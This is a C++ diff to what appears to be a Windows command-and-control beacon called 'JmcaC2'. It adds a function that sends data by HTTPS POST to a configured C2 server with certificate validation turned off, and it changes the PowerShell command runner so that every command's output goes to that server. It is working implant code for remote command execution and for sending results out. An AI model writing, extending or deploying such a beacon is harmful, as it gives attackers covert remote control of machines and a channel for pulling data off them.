@@ -15,6 +15,7 @@ const wchar_t* ACCEPTED_MIME_TYPES[] = {
 string runPSCommand(string command);
 int CreateTCPConn();
 bool sendHTTPTaskResult();
+bool sendTaskResults(const std::string& data);
 
 static std::wstring beaconName = L"";
 
@@ -149,6 +150,58 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
     return didReceiveResponse;
 }
 
+bool sendTaskResults(const std::string& data) {
+    HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
+    bool isRequestSuccessful{}, didReceiveResponse{};
+
+    if (!(hHTTPSession = WinHttpOpen(
+              L"JmcaC2 Task Results", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
+              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)))
+        return PrintWinHttpError("WinHttpOpen");
+
+    if (!(hHTTPConnection = WinHttpConnect(hHTTPSession, HTTP_SERVER_IP,
+                                           (INTERNET_PORT)HTTP_SERVER_PORT, 0)))
+        return PrintWinHttpError("WinHttpOpen");
+
+    if (!(hHTTPRequest = WinHttpOpenRequest(
+              hHTTPConnection, L"POST", RESOURCE_NAME, NULL, WINHTTP_NO_REFERER,
+              ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE)))
+        return PrintWinHttpError("WinHttpOpenRequest");
+
+    std::cout << "Request Sent" << std::endl;
+
+    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+
+    if (!WinHttpSetOption(hHTTPRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags,
+                          sizeof(flags)))
+        return PrintWinHttpError("WinHttpSetOption");
+
+    std::wstring headers = L"Content-Type: application/octet-stream\r\n";
+
+    if (!beaconName.empty()) {
+        headers += L"BeaconName: " + beaconName + L"\r\n";
+    }
+
+    // should be replaced if POST
+    if (!(isRequestSuccessful = WinHttpSendRequest(
+              hHTTPRequest, headers.c_str(), (DWORD)-1, (LPVOID)data.data(),
+              (DWORD)data.size(), (DWORD)data.size(), 0)))
+        return PrintWinHttpError("WinHttpSendRequest");
+
+    if (!(didReceiveResponse = WinHttpReceiveResponse(hHTTPRequest, NULL)))
+        return PrintWinHttpError("WinHttpReceiveResponse");
+
+    DWORD dwSize = 0;
+
+    if (hHTTPRequest) WinHttpCloseHandle(hHTTPRequest);
+    if (hHTTPConnection) WinHttpCloseHandle(hHTTPConnection);
+    if (hHTTPSession) WinHttpCloseHandle(hHTTPSession);
+
+    return didReceiveResponse;
+}
+
 string runPSCommand(string command) {
     char psBuffer[DEFAULT_PS_BUFLEN];
     string res;
@@ -167,6 +220,8 @@ string runPSCommand(string command) {
     }
 
     int exitCode = _pclose(pPipe);
+
+    sendTaskResults(res);
 
     return res;
 
